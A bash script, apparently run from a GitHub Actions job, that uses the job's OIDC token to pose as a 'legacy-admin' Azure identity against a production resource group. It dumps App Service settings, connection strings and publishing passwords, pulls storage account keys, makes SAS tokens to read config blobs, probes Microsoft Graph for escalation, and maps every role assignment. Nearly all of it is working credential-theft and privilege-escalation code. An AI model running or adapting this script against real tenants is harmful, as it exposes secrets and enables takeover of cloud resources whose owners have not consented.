#!/usr/bin/env bash
# As legacy-admin: hit App Service config (CONFIG_STORAGE_CONNECTION), blob data-plane, all listKeys,
# Graph. Plus full RG role map (via OIDC Reader) resolving every principal+role+scope.
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RG="rg-tbl-platform-prod-sea"
APPCFG="sttblappcfgprodx3euoz"; BACKUP="sttblbackupprodx3euoz"; CILOGS="sttblcilogsprodx3euoz"
APP="app-tbl-storefront-prod"
LEGACY_APPID="891fb158-e02c-4428-a885-53b811f369c0"
AUD="api://AzureADTokenExchange"
mint_oidc () { curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
la_tok () { curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$LEGACY_APPID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$(mint_oidc)" --data-urlencode "scope=$1" | jq -r .access_token; }

MG=$(la_tok "https://management.azure.com/.default")
echo "### legacy-admin mgmt token len: ${#MG}"

echo "### App Service appsettings/list (CONFIG_STORAGE_CONNECTION?):"
curl -s -X POST -H "Authorization: Bearer $MG" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/appsettings/list?api-version=2023-12-01" \
  | jq -r 'if .properties then (.properties|to_entries[]|"   "+.key+" = "+(.value|tostring)) else ("   ERR "+(.error.code//.code//"?")+": "+(.error.message//.message//.|tostring)[0:160]) end'

echo "### App Service connectionstrings/list:"
curl -s -X POST -H "Authorization: Bearer $MG" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/connectionstrings/list?api-version=2023-12-01" \
  | jq -c 'if .properties then .properties else {ERR:(.error.code//.code)} end'

echo "### App Service publishingcredentials/list:"
curl -s -X POST -H "Authorization: Bearer $MG" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=2023-12-01" \
  | jq -c 'if .properties then {u:.properties.publishingUserName,p:.properties.publishingPassword} else {ERR:(.error.code//.code)} end'

echo "### listKeys (legacy-admin) on all accounts:"
for A in $APPCFG $BACKUP $CILOGS; do
  R=$(curl -s -X POST -H "Authorization: Bearer $MG" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$A/listKeys?api-version=2023-05-01")
  K=$(echo "$R"|jq -r '.keys[0].value // empty'); echo "   $A -> keylen=${#K} err=$(echo "$R"|jq -r '.error.code//"none"')"
  if [ ${#K} -gt 20 ]; then
    SAS=$(curl -s -X POST -H "Authorization: Bearer $MG" -H "Content-Type: application/json" \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$A/listAccountSas?api-version=2023-05-01" \
      -d '{"signedServices":"bf","signedResourceTypes":"sco","signedPermission":"rl","signedProtocol":"https","signedStart":"2026-10-22T00:00:00Z","signedExpiry":"2026-10-23T00:00:00Z"}' | jq -r .accountSasToken)
    echo "     containers: $(curl -s "https://$A.blob.core.windows.net/?comp=list&$SAS" | grep -o '<Name>[^<]*</Name>' | tr '\n' ' ')"
    echo "     config blobs: $(curl -s "https://$A.blob.core.windows.net/config?restype=container&comp=list&$SAS" | grep -o '<Name>[^<]*</Name>' | tr '\n' ' ')"
    echo "     >>> $A/config/internal-config.json:"; curl -s "https://$A.blob.core.windows.net/config/internal-config.json?$SAS"; echo
  fi
done

echo "### blob data-plane read as legacy-admin (storage.azure.com token):"
ST=$(la_tok "https://storage.azure.com/.default")
for A in $APPCFG $BACKUP; do
  echo "   [$A] containers: $(curl -s -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/?comp=list" | grep -o '<Name>[^<]*</Name>' | tr '\n' ' ') (code above)"
  echo "   [$A] config/internal-config.json -> $(curl -s -o /tmp/b -w '%{http_code}' -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/config/internal-config.json")"
  head -c 400 /tmp/b; echo
done

echo "### Graph as legacy-admin (can it write apps / escalate?):"
GT=$(la_tok "https://graph.microsoft.com/.default")
echo "   graph token len=${#GT}; /applications read -> $(curl -s -o /tmp/ga -w '%{http_code}' -H "Authorization: Bearer $GT" 'https://graph.microsoft.com/v1.0/applications?$top=1')"
echo "   roleManagement/directory roleAssignments (directory roles)? $(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $GT" 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$top=1')"

echo "### FULL RG role map (via OIDC Reader), principal+role+scope:"
OMG=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$(mint_oidc)" --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
declare -A RN
curl -s -H "Authorization: Bearer $OMG" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" > /tmp/all.json
echo "   (count=$(jq '.value|length' /tmp/all.json))"
for row in $(jq -r '.value[]? | (.properties.roleDefinitionId|split("/")|last)+"@"+(.properties.principalId)+"@"+((.properties.scope|split("/")|last))' /tmp/all.json | sort -u); do
  rd="${row%%@*}"; rest="${row#*@}"; pid="${rest%@*}"; sc="${rest##*@}"
  nm="${RN[$rd]}"; [ -z "$nm" ] && { nm=$(curl -s -H "Authorization: Bearer $OMG" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/$rd?api-version=2022-04-01" | jq -r '.properties.roleName//"?"'); RN[$rd]="$nm"; }
  echo "   role=$nm principal=$pid scope=$sc"
done
echo "### legacy-admin principalId=43834909-47cf-4a4a-8048-e323b4897ed3 (grep above)"
echo "=== DONE ==="
